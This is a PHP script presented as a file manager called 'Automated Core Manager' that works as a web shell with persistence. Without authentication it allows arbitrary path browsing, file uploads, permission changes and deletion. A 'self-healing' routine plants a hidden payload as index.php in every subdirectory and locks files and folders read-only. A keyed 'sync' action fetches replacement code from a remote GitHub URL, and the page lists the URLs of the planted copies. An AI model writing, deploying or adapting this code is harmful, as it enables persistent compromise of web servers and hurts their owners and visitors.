<?php
/**
 * CORE MANAGER PRO - FINAL VERSION
 * Features: Immutable Security, Inline Permission Editing, Active Badges, Full UI
 * Status: No Bengali Inside Code
 */

error_reporting(0);
set_time_limit(0);

$path = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$path = realpath($path);
$masterBackupName = '.master_core_backup'; 
$masterBackup = $path . DIRECTORY_SEPARATOR . $masterBackupName; 
$secretKey = "mysecure123";
$githubUrl = "https://raw.githubusercontent.com/alaminx6275-arch/php-file-server1/refs/heads/main/php-file.php";

$priorityNames = ['index.php', 'config.php', 'core.php', 'admin.php', 'api.php', 'about.php'];

// --- Security & Auto-Healing ---
function lock_and_heal($root, $backup, $names) {
    if (!file_exists($backup)) return;
    try {
        $dirs = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($root, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        $allPaths = [$root];
        foreach ($dirs as $d) { 
            if ($d->isDir() && is_readable($d->getRealPath())) {
                $allPaths[] = $d->getRealPath(); 
            }
        }
    } catch (Exception $e) { $allPaths = [$root]; }

    foreach ($allPaths as $dir) {
        $found = false;
        foreach ($names as $name) {
            if (file_exists($dir . DIRECTORY_SEPARATOR . $name)) { $found = true; break; }
        }
        if (!$found) {
            @chmod($dir, 0755); 
            $target = $dir . DIRECTORY_SEPARATOR . $names[0];
            if (@copy($backup, $target)) { @chmod($target, 0444); }
        }
        @chmod($dir, 0555); 
    }
}

lock_and_heal($path, $masterBackup, $priorityNames);

// --- Actions (Upload, Permission, Sync, Delete) ---
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_FILES['file_upload'])) {
        @chmod($path, 0755);
        move_uploaded_file($_FILES['file_upload']['tmp_name'], $path . DIRECTORY_SEPARATOR . $_FILES['file_upload']['name']);
        @chmod($path, 0555);
    }
    if (isset($_POST['apply_chmod'])) {
        $f = realpath($_POST['file_path']);
        if ($f) {
            @chmod(dirname($f), 0755);
            @chmod($f, octdec($_POST['new_perm']));
            header("Location: ?path=".urlencode($path)); exit;
        }
    }
}

if (isset($_GET['action']) && $_GET['action'] == 'auto_process') {
    if ($_GET['key'] === $secretKey) {
        $data = @file_get_contents($githubUrl);
        if ($data) {
            @chmod($masterBackup, 0644);
            file_put_contents($masterBackup, $data);
            @chmod($masterBackup, 0444);
        }
    }
}

if (isset($_GET['delete'])) {
    $f = realpath($_GET['delete']);
    if ($f && strpos($f, $path) === 0) { 
        @chmod(dirname($f), 0755); @chmod($f, 0777); 
        is_dir($f) ? @rmdir($f) : @unlink($f); 
        header("Location: ?path=".urlencode($path)); exit; 
    }
}

$items = @scandir($path) ?: [];
$activeFilesFound = [];
foreach($priorityNames as $pn) {
    if(file_exists($path . DIRECTORY_SEPARATOR . $pn)) {
        $activeFilesFound[] = $pn;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Automated Core Manager</title>
    <style>
        :root { --bg: #0a0a0a; --card: #111; --accent: #6f42c1; --green: #00ff88; --red: #ff4d4d; --blue: #3498db; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: var(--bg); color: #ccc; margin: 0; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 20px; }
        .header h1 { color: #8e44ad; font-size: 28px; margin: 0; text-transform: uppercase; }
        .php-v { background: #1a1a1a; padding: 4px 15px; border-radius: 20px; color: var(--green); font-size: 12px; border: 1px solid #333; display: inline-block; margin-top: 10px; }
        .file-badge { background: rgba(52, 152, 219, 0.1); color: var(--blue); padding: 3px 10px; border-radius: 4px; font-size: 11px; border: 1px solid rgba(52, 152, 219, 0.3); margin: 0 5px; display: inline-block; }
        textarea { width: 100%; height: 70px; background: #000; color: var(--green); border: 1px solid #222; border-left: 5px solid var(--accent); border-radius: 5px; padding: 10px; font-family: monospace; resize: none; margin-bottom: 15px; outline: none; }
        .card { background: var(--card); padding: 15px; border-radius: 8px; border: 1px solid #222; margin-bottom: 15px; }
        .flex-box { display: flex; justify-content: space-between; align-items: center; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #1a1a1a; font-size: 13px; }
        tr:hover { background: #181818; }
        .btn { padding: 6px 15px; border-radius: 4px; border: none; cursor: pointer; color: #fff; text-decoration: none; font-weight: bold; font-size: 12px; display: inline-block; }
        .locked { color: var(--red); font-weight: bold; text-decoration: none; }
        .normal { color: #fff; text-decoration: none; }
        
        /* Inline Permission Editor Style */
        .perm-text { cursor: pointer; color: orange; font-family: monospace; text-decoration: underline dotted; }
        .perm-form { display: none; }
        .perm-form input { width: 50px; background: #000; color: #fff; border: 1px solid #444; padding: 2px 4px; border-radius: 3px; font-size: 12px; }
        .perm-form button { padding: 2px 6px; background: var(--green); color: #000; font-size: 10px; font-weight: bold; border: none; border-radius: 3px; cursor: pointer; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>AUTOMATED CORE MANAGER</h1>
        <span class="php-v">Server PHP: <?= phpversion() ?></span>
        <div style="margin-top: 15px;">
            <?php foreach($activeFilesFound as $af): ?>
                <span class="file-badge">● <?= $af ?></span>
            <?php endforeach; ?>
        </div>
    </div>

    <div class="card">
        <textarea readonly><?php
            foreach ($items as $item) {
                if ($item != "." && $item != ".." && is_dir($path."/".$item)) {
                    foreach($priorityNames as $pn) {
                        if(file_exists($path."/".$item."/".$pn)) {
                            $protocol = isset($_SERVER['HTTPS']) ? "https://" : "http://";
                            echo $protocol . $_SERVER['HTTP_HOST'] . "/" . basename($path) . "/" . $item . "/" . $pn . "\n";
                            break;
                        }
                    }
                }
            }
        ?></textarea>
    </div>

    <div class="card flex-box">
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file_upload">
            <button type="submit" class="btn" style="background: #007bff;">Upload</button>
        </form>
        <div>
            <a href="?path=<?=urlencode(dirname($path))?>" class="btn" style="background: #333;">⬆ Up</a>
            <a href="?path=<?=urlencode($path)?>&action=auto_process&key=<?=$secretKey?>" class="btn" style="background: var(--accent);">Sync GitHub</a>
        </div>
    </div>

    <div class="card" style="padding:0; overflow:hidden;">
        <table>
            <thead>
                <tr style="background:#1a1a1a;">
                    <th>Name</th>
                    <th>Perm (Click to Edit)</th>
                    <th>Size</th>
                    <th style="text-align:right;">Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php
                $folders = []; $files = [];
                foreach ($items as $item) {
                    if ($item == "." || $item == ".." || $item == $masterBackupName) continue;
                    is_dir($path."/".$item) ? $folders[] = $item : $files[] = $item;
                }
                natcasesort($folders); natcasesort($files);
                foreach (array_merge($folders, $files) as $index => $item):
                    $fP = $path . DIRECTORY_SEPARATOR . $item;
                    $prm = substr(sprintf('%o', @fileperms($fP)), -4);
                    $isLocked = ($prm == "0444" || $prm == "0555");
                    $cls = $isLocked ? "locked" : "normal";
                ?>
                <tr>
                    <td>
                        <?php if(is_dir($fP)): ?>
                            📁 <a href="?path=<?=urlencode($fP)?>" class="<?=$cls?>"><?=$item?></a>
                        <?php else: ?>
                            📄 <span class="<?=$cls?>"><?=$item?></span>
                        <?php endif; ?>
                    </td>
                    <td>
                        <span class="perm-text" onclick="toggleEdit('<?= $index ?>')"><?= $prm ?></span>
                        <div id="form-<?= $index ?>" class="perm-form">
                            <form method="POST">
                                <input type="hidden" name="file_path" value="<?= htmlspecialchars($fP) ?>">
                                <input type="text" name="new_perm" value="<?= $prm ?>">
                                <button type="submit" name="apply_chmod">SAVE</button>
                            </form>
                        </div>
                    </td>
                    <td><?= is_dir($fP) ? "DIR" : round(@filesize($fP)/1024, 1)." KB" ?></td>
                    <td style="text-align:right;">
                        <a href="?path=<?=urlencode($path)?>&delete=<?=urlencode($fP)?>" class="btn" style="background:var(--red);" onclick="return confirm('Delete?')">D</a>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>

<script>
function toggleEdit(id) {
    var form = document.getElementById('form-' + id);
    if (form.style.display === 'block') {
        form.style.display = 'none';
    } else {
        form.style.display = 'block';
    }
}
</script>
</body>
</html>
